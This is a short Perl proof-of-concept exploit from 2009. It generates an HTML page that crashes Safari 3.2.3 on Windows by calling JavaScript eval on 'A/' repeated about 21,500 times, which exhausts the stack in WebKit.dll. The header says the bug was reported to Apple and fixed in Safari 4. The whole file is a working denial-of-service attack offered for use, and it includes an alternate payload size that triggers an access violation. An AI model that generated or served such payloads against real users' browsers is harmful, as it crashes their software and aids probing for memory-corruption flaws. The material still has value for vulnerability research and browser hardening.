#!/usr/bin/perl
# letsgosurfinnowonsafari.pl
# AKA
# Safari 3.2.3 (Win32) JavaScript 'eval' Remote Denial of Service Exploit
#
# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.07.2009
#
# *********************************************************************************************************
# Safari crashes when interpreting a webpage that calls the "eval" JavaScript function with "A/" repeating
# 21526 times (43052 bytes). When triggering this vulnerability, Safari will throw a "Stack Overflow"
# exception, and then an access violation when adjusting the trigger to "A/" repeating 21697 times
# (43394 bytes). The problem originates in the module "WebKit.dll". Safari uses this module as part of the
# WebKit layout engine (www.webkit.org).

# This issue was reported to Apple several months ago and it looks like they fixed it in Safari 4
# (4.1.2 tested) after recent testing. It has also been lying around the Fun Archive @ krakowlabs.com for
# quite a while too. Btw, STACK_OVERFLOW does NOT mean there is a buffer overflow on the stack. It pretty
# much means that the stack for the process has been exhausted and its maximum size has been reached.
# *********************************************************************************************************
# letsgosurfinnowonsafari.pl

$fn   = 'letsgosurfinnowwithsafari.html';
$size = 21526; # "Stack Overflow" WebKit.dll
#$size = 21697; # "Access Violation" WebKit.dll

$payload = '<html><script type="text/javascript">' . "\n";
$payload = $payload . 'eval("' . "A/" x $size . '");' . "\n";
$payload = $payload . '</script></html>';

     open(FD, '>' . $fn);
     print FD $payload;
     close(FD);
